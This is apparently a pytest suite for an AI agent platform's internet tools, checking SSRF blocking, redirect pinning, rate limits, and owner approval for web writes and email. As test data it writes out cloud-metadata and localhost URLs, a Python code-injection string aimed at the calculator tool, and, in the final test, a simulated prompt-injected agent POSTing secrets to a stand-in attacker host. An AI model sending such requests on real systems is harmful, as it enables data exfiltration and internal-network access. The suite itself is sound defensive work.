"""Internet access for every agent: tool suite, safety guards, internet modes, web writes and email."""
import asyncio
import json
from pathlib import Path

import httpx
import pytest

from helpers import new_mission
from nexus.appctx import build_context
from nexus.bootstrap import ensure_fake_provider
from nexus.connectors.service import apply_internet_policy, ensure_web_connector
from nexus.domain.missions import create_project, grant_universal_capabilities, UNIVERSAL_CAPABILITIES
from nexus.persistence.db import dumps
from nexus.secrets import MemorySecretStore
from nexus.tools.broker import ToolContext
from nexus.tools.builtin import expand_capabilities
from nexus.tools.sandbox import UnavailableSandbox

HOSTS = {"news.example.com": "93.184.216.10", "docs.example.com": "93.184.216.11", "html.duckduckgo.com": "93.184.216.12",
         "en.wikipedia.org": "93.184.216.13", "export.arxiv.org": "93.184.216.14", "pypi.org": "93.184.216.15",
         "geocoding-api.open-meteo.com": "93.184.216.16", "api.open-meteo.com": "93.184.216.17",
         "api.frankfurter.app": "93.184.216.18", "hooks.example.com": "93.184.216.19", "evil.example.net": "93.184.216.20",
         "api.search.brave.com": "93.184.216.21", "localhost": "127.0.0.1", "rebind.example.com": "10.1.2.3",
         "nas.lan": "192.168.1.20"}

def make_pdf(text: str) -> bytes:
    """A minimal valid one-page PDF with a correct cross-reference table."""
    stream = f"BT /F1 12 Tf 20 50 Td ({text}) Tj ET".encode()
    objs = [b"<</Type/Catalog/Pages 2 0 R>>", b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
            b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 100]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>",
            b"<</Length %d>>stream\n" % len(stream) + stream + b"\nendstream",
            b"<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>"]
    out, offsets = bytearray(b"%PDF-1.4\n"), []
    for i, o in enumerate(objs, 1):
        offsets.append(len(out))
        out += b"%d 0 obj" % i + o + b"endobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    out += b"".join(b"%010d 00000 n \n" % off for off in offsets)
    out += b"trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF" % (len(objs) + 1, xref)
    return bytes(out)


MINI_PDF = make_pdf("Hello PDF world")

DDG_HTML = """<div class="result"><a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fnews.example.com%2Fstory&amp;rut=x">Bike <b>share</b> news</a>
<a class="result__snippet" href="#">Larkspur considers a <b>pilot</b>.</a></div>
<div class="result"><a class="result__a" href="https://docs.example.com/guide">Guide</a><a class="result__snippet">How to</a></div>"""


class Web(httpx.AsyncBaseTransport):
    """Fake internet keyed by Host header (requests are pinned to vetted IPs)."""

    def __init__(self):
        self.seen: list[httpx.Request] = []
        self.posts: list[dict] = []

    async def handle_async_request(self, request):
        self.seen.append(request)
        host, path = request.headers["host"], request.url.path
        if host == "news.example.com":
            if path == "/redirect-internal":
                return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data/"})
            if path == "/redirect-public":
                return httpx.Response(301, headers={"location": "https://docs.example.com/guide"})
            if path == "/paper.pdf":
                return httpx.Response(200, content=MINI_PDF, headers={"content-type": "application/pdf"})
            return httpx.Response(200, text="<html><head><title>Larkspur Gazette</title><script>steal()</script></head><body>"
                                  "<h1>Bike share pilot</h1><p>The council will vote in May.</p>"
                                  "<a href='/vote'>Vote details</a></body></html>", headers={"content-type": "text/html; charset=utf-8"})
        if host == "docs.example.com":
            return httpx.Response(200, text="<title>Guide</title><p>guide body</p>", headers={"content-type": "text/html"})
        if host == "html.duckduckgo.com":
            return httpx.Response(200, text=DDG_HTML, headers={"content-type": "text/html"})
        if host == "api.search.brave.com":
            assert request.headers.get("x-subscription-token") == "brave-KEY-123456"
            return httpx.Response(200, json={"web": {"results": [{"title": "B", "url": "https://news.example.com/b", "description": "d"}]}})
        if host == "en.wikipedia.org" and "search" in path:
            return httpx.Response(200, json={"pages": [{"key": "Bicycle-sharing_system", "title": "Bicycle-sharing system"}]})
        if host == "en.wikipedia.org":
            return httpx.Response(200, json={"title": "Bicycle-sharing system", "extract": "A service in which bicycles are shared.",
                                             "content_urls": {"desktop": {"page": "https://en.wikipedia.org/wiki/Bicycle-sharing_system"}}})
        if host == "export.arxiv.org":
            return httpx.Response(200, text='<feed xmlns="http://www.w3.org/2005/Atom"><entry><id>http://arxiv.org/abs/1</id>'
                                  '<title>Bike sharing demand</title><summary>We model demand.</summary><published>2024-01-01T00:00:00Z</published>'
                                  '<author><name>A. Author</name></author><link title="pdf" href="http://arxiv.org/pdf/1"/></entry></feed>')
        if host == "pypi.org":
            return httpx.Response(200, json={"info": {"name": "httpx", "version": "0.28.1", "summary": "HTTP client",
                                                      "license_expression": "BSD-3-Clause"}, "releases": {"0.28.1": [{"upload_time": "2024-12-06"}]}})
        if host == "geocoding-api.open-meteo.com":
            return httpx.Response(200, json={"results": [{"name": "Larkspur", "country": "US", "latitude": 37.9, "longitude": -122.5}]})
        if host == "api.open-meteo.com":
            return httpx.Response(200, json={"current": {"temperature_2m": 18.2}, "current_units": {"temperature_2m": "°C"}, "daily": {}})
        if host == "api.frankfurter.app":
            return httpx.Response(200, json={"base": "USD", "rates": {"EUR": 0.9}})
        if host in ("hooks.example.com", "evil.example.net"):
            self.posts.append({"host": host, "method": request.method, "headers": dict(request.headers),
                               "body": request.content.decode()})
            return httpx.Response(201, json={"ok": True})
        if host == "nas.lan":
            return httpx.Response(200, text="nas ok")
        return httpx.Response(404)


def resolver(host):
    if host not in HOSTS:
        raise OSError("unknown host")
    return [HOSTS[host]]


@pytest.fixture
def wctx(tmp_path):
    web = Web()
    c = build_context(tmp_path / "d", secrets=MemorySecretStore(), sandbox=UnavailableSandbox("test"),
                      http_transport=web, web_resolver=resolver)
    c.web_fake = web
    c.heartbeat_s, c.lease_ttl_ms = 0.2, 5000
    yield c
    c.close()


def tool_ctx(c, pid, internet=None, caps=None):
    agent = c.db.one("SELECT a.id, v.tool_permissions_json FROM agent_identities a JOIN agent_versions v ON"
                     " v.id = a.current_version_id WHERE a.project_id = ? LIMIT 1", (pid,))
    caps = caps or json.loads(agent["tool_permissions_json"])
    return ToolContext(project_id=pid, workspace_root=c.data_dir, agent_id=agent["id"],
                       allowed_tools=expand_capabilities(c.broker, caps), extra={"internet": internet or {}})


def project(c):
    with c.db.tx() as cur:
        return create_project(cur, name="p", workspace_root=str(c.data_dir))


async def call(c, t, name, args, op=[0]):
    op[0] += 1
    return await c.broker.invoke(t, name, args, operation_id=f"op-{op[0]}")


async def test_every_agent_has_internet_and_utilities(wctx):
    pid = project(wctx)
    roles = wctx.db.query("SELECT v.role_default, v.tool_permissions_json FROM agent_identities a JOIN agent_versions v ON"
                          " v.id = a.current_version_id WHERE a.project_id = ?", (pid,))
    assert len(roles) == 9
    sentinel = [r for r in roles if r["role_default"] == "guardian"]
    assert len(sentinel) == 1 and json.loads(sentinel[0]["tool_permissions_json"]) == [], "the monitor has no tools"
    for r in [r for r in roles if r["role_default"] != "guardian"]:
        names = {s.name for s in wctx.broker.specs_for(tool_ctx(wctx, pid, caps=json.loads(r["tool_permissions_json"])))}
        assert {"web_search", "fetch_url", "download_file", "read_pdf", "wikipedia", "calculator", "remember"} <= names, r["role_default"]
    assert len(wctx.broker.capability_bundles["internet"]) >= 17 and len(wctx.broker.capability_bundles["utilities"]) >= 9
    # Older agents are upgraded once, as a new version (history kept).
    with wctx.db.tx() as cur:
        a = cur.execute("SELECT a.id, a.current_version_id FROM agent_identities a WHERE project_id = ? LIMIT 1", (pid,)).fetchone()
        cur.execute("UPDATE agent_versions SET tool_permissions_json = '[\"read_workspace\"]' WHERE id = ?", (a["current_version_id"],))
        assert grant_universal_capabilities(cur) == 1
        v = cur.execute("SELECT tool_permissions_json, version FROM agent_versions v JOIN agent_identities a ON"
                        " a.current_version_id = v.id WHERE a.id = ?", (a["id"],)).fetchone()
    assert set(UNIVERSAL_CAPABILITIES) <= set(json.loads(v["tool_permissions_json"])) and v["version"] == 2


@pytest.mark.parametrize("url,reason", [
    ("http://127.0.0.1:8000/api/health", "non-public"), ("http://localhost:5555/", "non-public"),
    ("http://169.254.169.254/latest/meta-data/", "non-public"), ("http://[::1]/", "non-public"),
    ("http://rebind.example.com/", "non-public"), ("file:///C:/Windows/win.ini", "only http"),
    ("https://user:pw@news.example.com/", "credentials"), ("https://news.example.com/redirect-internal", "non-public"),
])
async def test_local_network_and_metadata_are_blocked(wctx, url, reason):
    pid = project(wctx)
    r = await call(wctx, tool_ctx(wctx, pid), "fetch_url", {"url": url})
    assert not r["ok"] and reason in r["error"], r


async def test_pinning_redirects_and_private_allowlist(wctx):
    pid = project(wctx)
    r = await call(wctx, tool_ctx(wctx, pid), "fetch_url", {"url": "https://news.example.com/redirect-public"})
    assert r["ok"] and r["result"]["url"] == "https://docs.example.com/guide"
    req = wctx.web_fake.seen[-1]
    assert req.url.host == HOSTS["docs.example.com"] and req.headers["host"] == "docs.example.com"
    assert req.extensions.get("sni_hostname") == "docs.example.com", "TLS stays bound to the real hostname"
    denied = await call(wctx, tool_ctx(wctx, pid), "fetch_url", {"url": "http://nas.lan/status"})
    assert not denied["ok"]
    ok = await call(wctx, tool_ctx(wctx, pid, {"allowed_private_hosts": ["nas.lan"]}), "fetch_url", {"url": "http://nas.lan/status"})
    assert ok["ok"] and "nas ok" in ok["result"]["text"]


async def test_fetch_extracts_text_and_records_evidence(wctx):
    pid = project(wctx)
    t = tool_ctx(wctx, pid)
    r = (await call(wctx, t, "fetch_url", {"url": "https://news.example.com/story?utm_source=x"}))["result"]
    assert r["title"] == "Larkspur Gazette" and "council will vote in May" in r["text"] and "steal()" not in r["text"]
    ev = wctx.db.one("SELECT * FROM evidence WHERE id = ?", (r["evidence_id"],))
    assert ev["lineage_root"] == "https://news.example.com/story", "tracking params do not create new lineages"
    links = (await call(wctx, t, "extract_links", {"url": "https://news.example.com/story"}))["result"]["links"]
    assert links == [{"url": "https://news.example.com/vote", "text": "Vote details"}]
    pdf = (await call(wctx, t, "fetch_url", {"url": "https://news.example.com/paper.pdf"}))["result"]
    assert "Hello PDF world" in pdf["text"]
    dl = (await call(wctx, t, "download_file", {"url": "https://news.example.com/paper.pdf"}))["result"]
    rp = (await call(wctx, t, "read_pdf", {"artifact_id": dl["artifact_id"]}))["result"]
    assert "Hello PDF world" in rp["text"]


async def test_search_and_knowledge_tools(wctx):
    pid = project(wctx)
    t = tool_ctx(wctx, pid)
    s = (await call(wctx, t, "web_search", {"query": "larkspur bike share"}))["result"]
    assert s["provider"] == "duckduckgo" and s["results"][0]["url"] == "https://news.example.com/story"
    assert s["results"][0]["snippet"] == "Larkspur considers a pilot."
    ref = wctx.secrets.put("brave-KEY-123456")
    with wctx.db.tx() as cur:
        cur.execute("INSERT INTO settings VALUES ('search.provider', ?, '')", (dumps({"kind": "brave", "secret_ref": ref}),))
    b = (await call(wctx, t, "web_search", {"query": "x"}))["result"]
    assert b["provider"] == "brave" and b["results"][0]["url"] == "https://news.example.com/b"
    nocontact = await call(wctx, t, "wikipedia", {"query": "bike sharing"})
    assert not nocontact["ok"] and "contact" in nocontact["error"]
    t = tool_ctx(wctx, pid, {"contact": "owner@example.org"})
    w = (await call(wctx, t, "wikipedia", {"query": "bike sharing"}))["result"]
    assert "owner@example.org" in wctx.web_fake.seen[-1].headers["user-agent"]
    assert w["title"] == "Bicycle-sharing system" and w["evidence_id"]
    assert (await call(wctx, t, "arxiv_search", {"query": "bike"}))["result"]["results"][0]["title"] == "Bike sharing demand"
    assert (await call(wctx, t, "package_info", {"name": "httpx"}))["result"]["version"] == "0.28.1"
    assert (await call(wctx, t, "weather", {"place": "Larkspur"}))["result"]["current"]["temperature_2m"] == 18.2
    assert (await call(wctx, t, "exchange_rates", {"base": "usd", "symbols": ["eur"]}))["result"]["rates"]["EUR"] == 0.9
    assert all("x-subscription-token" not in r.headers for r in wctx.web_fake.seen if r.headers["host"] != "api.search.brave.com")


async def test_utilities(wctx):
    pid = project(wctx)
    t = tool_ctx(wctx, pid)
    assert (await call(wctx, t, "calculator", {"expression": "round(sqrt(2) * 100) / 4"}))["result"]["result"] == 35.25
    bad = await call(wctx, t, "calculator", {"expression": "__import__('os').system('calc')"})
    assert not bad["ok"]
    q = (await call(wctx, t, "json_query", {"json": '{"a": {"b": [{"c": 5}]}}', "path": "a.b[0].c"}))["result"]
    assert q["value"] == 5
    c = (await call(wctx, t, "csv_preview", {"text": "city,riders\nA,10\nB,30\n"}))["result"]
    assert c["rows"] == 2 and c["column_stats"]["riders"]["mean"] == 20
    d = (await call(wctx, t, "date_time", {"from_date": "2026-01-01", "to_date": "2026-03-01"}))["result"]
    assert d["days_between"] == 59
    m = (await call(wctx, t, "remember", {"note": "Council votes in May"}))["result"]
    assert m["status"] == "committed"


async def test_internet_modes_and_web_writes(wctx):
    pid = project(wctx)
    cid = await ensure_web_connector(wctx.services.connectors, pid)
    t = tool_ctx(wctx, pid)
    names = {s.name for s in wctx.broker.specs_for(t)}
    assert {"svc__web__send_request", "svc__web__submit_form", "svc__web__delete_request"} <= names
    # Default: read_write with writes asking the owner.
    r = await call(wctx, t, "svc__web__send_request", {"method": "POST", "url": "https://hooks.example.com/x",
                                                        "json": {"msg": "hi"}, "headers": {"Authorization": "Bearer stolen"},
                                                        "rationale": "notify"})
    assert r["result"]["status"] == "pending" and wctx.web_fake.posts == []
    await wctx.services.connectors.decide(r["result"]["action_request_id"], approve=True)
    assert len(wctx.web_fake.posts) == 1
    sent = wctx.web_fake.posts[0]
    assert "authorization" not in sent["headers"] and sent["headers"]["idempotency-key"]
    assert json.loads(sent["body"]) == {"msg": "hi"}
    # Owner pre-approves writes: executes immediately. Deletes still ask.
    with wctx.db.tx() as cur:
        cur.execute("UPDATE projects SET settings_json = ? WHERE id = ?",
                    (dumps({"internet": {"mode": "read_write", "write_autonomy": "auto"}}), pid))
    apply_internet_policy(wctx.services.connectors, pid)
    t = tool_ctx(wctx, pid, {"mode": "read_write", "write_autonomy": "auto"})
    f = await call(wctx, t, "svc__web__submit_form", {"url": "https://hooks.example.com/form", "fields": {"a": "1"},
                                                       "rationale": "signup"})
    assert f["result"]["status"] == "succeeded" and wctx.web_fake.posts[-1]["body"] == "a=1"
    dl = await call(wctx, t, "svc__web__delete_request", {"url": "https://hooks.example.com/x/1", "rationale": "cleanup"})
    assert dl["result"]["status"] == "pending"
    # Read-only internet: writes denied, reads fine.
    with wctx.db.tx() as cur:
        cur.execute("UPDATE projects SET settings_json = ? WHERE id = ?", (dumps({"internet": {"mode": "read"}}), pid))
    apply_internet_policy(wctx.services.connectors, pid)
    t = tool_ctx(wctx, pid, {"mode": "read"})
    assert "svc__web__send_request" not in {s.name for s in wctx.broker.specs_for(t)}
    assert (await call(wctx, t, "fetch_url", {"url": "https://news.example.com/s"}))["ok"]
    # Off: only the legacy allowlist.
    t = tool_ctx(wctx, pid, {"mode": "off"})
    off = await call(wctx, t, "fetch_url", {"url": "https://news.example.com/s"})
    assert not off["ok"] and "internet access is off" in off["error"]
    with pytest.raises(Exception):
        wctx.services.connectors.remove(cid)


async def test_rate_limit(wctx):
    pid = project(wctx)
    t = tool_ctx(wctx, pid, {"max_requests_per_minute": 3})
    res = [await call(wctx, t, "fetch_url", {"url": f"https://docs.example.com/{i}"}) for i in range(4)]
    assert [r["ok"] for r in res] == [True, True, True, False] and "rate limit" in res[-1]["error"]


class SmtpStub:
    def __init__(self):
        self.messages = []

    async def handle(self, reader, writer):
        def send(line):
            writer.write((line + "\r\n").encode())
        send("220 stub ESMTP")
        rcpts, data_mode, buf = [], False, []
        while True:
            line = await reader.readline()
            if not line:
                break
            text = line.decode(errors="replace").rstrip("\r\n")
            if data_mode:
                if text == ".":
                    self.messages.append({"rcpts": rcpts, "data": "\n".join(buf)})
                    data_mode, buf = False, []
                    send("250 queued")
                else:
                    buf.append(text)
                continue
            cmd = text[:4].upper()
            if cmd in ("EHLO", "HELO"):
                send("250-stub")
                send("250 OK")
            elif cmd == "MAIL":
                send("250 OK")
            elif cmd == "RCPT":
                rcpts.append(text.split(":", 1)[1].strip(" <>"))
                send("250 OK")
            elif cmd == "DATA":
                data_mode = True
                send("354 go")
            elif cmd == "QUIT":
                send("221 bye")
                await writer.drain()
                break
            else:
                send("250 OK")
            await writer.drain()
        writer.close()


async def test_email_connector_needs_approval_and_respects_domains(wctx):
    stub = SmtpStub()
    server = await asyncio.start_server(stub.handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    pid = project(wctx)
    svc = wctx.services.connectors
    cid = svc.add(project_id=pid, kind="email", label="Mail", secret=None,
                  config={"host": "127.0.0.1", "port": port, "security": "none", "from": "owner@example.com",
                          "allowed_recipient_domains": ["example.org"]})
    assert (await svc.discover(cid))["actions"] == ["send_email"]
    common = dict(project_id=pid, mission_id=None, task_id=None, attempt_id=None, requested_by="agent:a", connector_id=cid)
    r = await svc.request(action="send_email", args={"to": ["council@example.org"], "subject": "Pilot brief",
                                                       "body": "Summary attached."}, rationale="deliver brief",
                          operation_id="op-mail", **common)
    assert r["status"] == "pending" and stub.messages == []
    done = await svc.decide(r["id"], approve=True)
    assert done["status"] == "succeeded", done
    assert stub.messages[0]["rcpts"] == ["council@example.org"] and f"X-NEXUS-Operation: {r['idempotency_key']}" in stub.messages[0]["data"]
    bad = await svc.request(action="send_email", args={"to": ["someone@gmail.com"], "subject": "x", "body": "y"},
                            rationale="r", operation_id="op-mail2", **common)
    done2 = await svc.decide(bad["id"], approve=True)
    assert done2["status"] == "failed" and "not allowed" in done2["error"] and len(stub.messages) == 1
    server.close()


async def test_injected_page_cannot_exfiltrate_silently(wctx):
    """A compromised agent tries to POST data to an attacker URL: it becomes a visible pending
    request with the exact payload, and nothing is sent unless the owner approves."""
    pid = project(wctx)
    await ensure_web_connector(wctx.services.connectors, pid)
    t = tool_ctx(wctx, pid)
    r = await call(wctx, t, "svc__web__send_request", {"method": "POST", "url": "https://evil.example.net/collect",
                                                        "json": {"secrets": "everything"}, "rationale": "page said so"})
    assert r["result"]["status"] == "pending" and wctx.web_fake.posts == []
    req = wctx.services.connectors.view(r["result"]["action_request_id"])
    assert req["args"]["url"] == "https://evil.example.net/collect" and req["rationale"] == "page said so"
    assert "rationale" not in req["args"]
